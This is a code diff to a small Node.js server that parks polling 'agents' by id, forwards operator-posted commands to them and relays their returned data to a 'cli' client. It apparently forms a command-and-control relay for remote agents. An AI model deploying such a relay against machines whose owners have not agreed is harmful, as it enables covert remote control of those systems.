@@ -35,26 +35,25 @@ var roots = {
                 });
                 
                 req.on('end', function() {
-                    var msg2 = JSON.parse(msg);
-                    console.log(blue + "Received command to forward to client/s:", green + msg2.agent);
+                    var cmdObj = JSON.parse(msg);
+                    console.log(blue + "Received command to forward to client/s:", green + cmdObj.agent);
                     console.log(blue + 'Sending message:', green + msg);
                     console.log(black + "============================================\n");
                     console.log(reset);
-                    res.writeHead(200, {'Content-Type': 'application/json'});
-                    res.end();
-                    var agentRes = agents[msg2.agent].response
+                    commander(req, res, 60000);
+                    var agentRes = agents[cmdObj.agent].response
                     agentRes.writeHead(200, {'Content-Type': 'application/json'});
                     agentRes.end(JSON.stringify({
                         success: true,
-                        cmd:msg2.cmd
+                        cmd:cmdObj.cmd
                     }));
                     
                 });
-
+                
             }else if (req.url.startsWith('/park/')){
                 commander(req, res, 60000);
             }
-            else{
+            else {
                 console.log(black + "\n============================================");
                 console.log(blue + "Received post at url: ", green + req.url);
                 console.log(blue + "Agent Info: ", green, req.headers["user-agent"]);
@@ -76,6 +75,12 @@ var roots = {
                         success: true,
                         redirect: '/park/'
                     }));
+                    var agentRes = agents['cli'].response
+                    agentRes.writeHead(200, {'Content-Type': 'application/json'});
+                    agentRes.end(JSON.stringify({
+                        status: 'ok',
+                        data:formData
+                    }));
 
                 });
             }
@@ -85,25 +90,23 @@ var roots = {
 
 function commander(req, res, timeout){
     try{
-    var id = /[?&]id=([^&]+)/.exec(req.url);
-    id = id[1];
-    agents[id] = {
-        id:id,
-        request:req,
-        response:res
-    };
-    console.log(agents.foo.id);
-    console.log(id);
-    setTimeout(function(){
-        res.writeHead(200, {'Content-Type': 'application/json'});
-        res.end(JSON.stringify({
-                        status: 'wait',
-                        redirect: '/park/'
-                    }));
-        return console.log('sent');
-    }, timeout);
+        var id = /[?&]id=([^&]+)/.exec(req.url);
+        id = id[1];
+        agents[id] = {
+            id:id,
+            request:req,
+            response:res
+        };
+        setTimeout(function(){
+            res.writeHead(200, {'Content-Type': 'application/json'});
+            res.end(JSON.stringify({
+                            status: 'wait',
+                            redirect: '/park/'
+                        }));
+            return console.log('reconnect');
+        }, timeout);
     }catch(e){
-        console.log('Invalid client!');
+        console.log('Bad client id!');
     }
 }
 
